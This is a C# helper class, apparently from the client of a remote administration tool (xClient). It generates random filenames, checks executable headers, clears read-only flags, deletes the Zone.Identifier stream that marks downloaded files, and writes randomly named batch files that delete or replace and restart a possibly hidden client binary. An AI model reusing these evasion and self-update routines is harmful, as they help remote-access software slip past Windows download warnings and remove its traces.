using System;
using System.IO;
using System.Text;
using xClient.Core.Data;
using xClient.Core.Utilities;

namespace xClient.Core.Helper
{
    public static class FileHelper
    {
        private const string CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        private static readonly Random _rnd = new Random(Environment.TickCount);

        public static string GetRandomFilename(int length, string extension = "")
        {
            StringBuilder randomName = new StringBuilder(length);
            for (int i = 0; i < length; i++)
                randomName.Append(CHARS[_rnd.Next(CHARS.Length)]);

            return string.Concat(randomName.ToString(), extension);
        }

        public static bool IsValidExecuteableFile(byte[] block)
        {
            if (block.Length < 2) return false;
            return (block[0] == 'M' && block[1] == 'Z') || (block[0] == 'Z' && block[1] == 'M');
        }

        public static bool DeleteZoneIdentifier(string filePath)
        {
            return NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
        }

        public static string CreateUninstallBatch(bool isFileHidden)
        {
            try
            {
                string batchFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    GetRandomFilename(12, ".bat"));

                string uninstallBatch = (isFileHidden)
                    ? "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del /A:H " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "del " + "\"" + batchFile + "\""
                    : "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "del " + "\"" + batchFile + "\""
                    ;

                File.WriteAllText(batchFile, uninstallBatch);
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public static string CreateUpdateBatch(string newFilePath, bool isFileHidden)
        {
            try
            {
                string batchFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    GetRandomFilename(12, ".bat"));

                string uninstallBatch = (isFileHidden)
                    ? "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del /A:H " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "move " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "del " + "\"" + batchFile + "\""
                    : "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "move " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                      "del " + "\"" + batchFile + "\""
                    ;

                File.WriteAllText(batchFile, uninstallBatch);
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public static bool ClearReadOnly(string filePath)
        {
            try
            {
                FileInfo fi = new FileInfo(filePath);
                if (!fi.Exists) return false;
                if (fi.IsReadOnly)
                    fi.IsReadOnly = false;
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
